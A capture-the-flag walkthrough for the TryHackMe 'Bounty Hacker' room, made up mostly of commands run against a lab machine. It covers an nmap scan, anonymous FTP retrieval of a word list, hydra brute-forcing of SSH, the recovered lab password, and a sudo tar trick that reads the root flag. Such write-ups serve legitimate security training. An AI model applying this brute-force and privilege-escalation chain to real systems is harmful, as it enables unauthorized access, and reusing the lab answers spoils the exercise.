---
description: https://tryhackme.com/room/cowboyhacker
---

# Bounty Hacker

### **Find open ports on the machine**

```
nmap 10.10.167.65
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 08-07-15.png>)

### &#x20;**Who wrote the task list?**&#x20;

```
lftp 10.10.167.65 -u anonymous,
lftp :~> set ftp:passive-mode off
lftp :~> ls -a
lftp :~> cat task.txt
lftp :~> cat locks.txt
lftp :~> get locks.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 08-10-01.png>)

### **What service can you bruteforce with the text file found?**

```
hydra -l lin -P locks.txt ssh://10.10.167.65 -I -f -V -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 08-12-58.png>)

### **What is the users password?**&#x20;

> RedDr4gonSynd1cat3

### **user.txt**

```
ssh lin@10.10.167.65 cat /home/lin/Desktop/user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 08-15-46.png>)

### **root.txt**

```
sudo -l
sudo /bin/tar cvf root.tar /root/root.txt
sudo /bin/tar xvf root.tar -O
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 08-24-11.png>)
